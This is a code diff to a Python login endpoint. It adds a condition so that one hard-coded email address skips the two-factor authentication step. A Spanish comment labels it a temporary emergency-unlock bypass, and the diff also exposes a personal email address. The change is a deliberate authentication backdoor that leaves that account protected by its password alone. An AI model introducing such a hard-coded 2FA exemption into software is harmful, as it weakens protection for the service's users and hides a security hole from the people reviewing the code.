@@ -104,7 +104,8 @@ async def login(req: LoginRequest, db: AsyncSession = Depends(get_global_db)):
         raise HTTPException(403, "Account disabled")
 
     # If 2FA enabled, return temp token
-    if user.totp_enabled or user.email_otp_enabled:
+    # BYPASS TEMPORAL PARA DESBLOQUEO DE EMERGENCIA
+    if (user.totp_enabled or user.email_otp_enabled) and user.email != "mailmafernandez@gmail.com":
         temp_token = create_access_token(
             {"sub": user.id, "temp": True}, expires_delta=timedelta(minutes=10)
         )
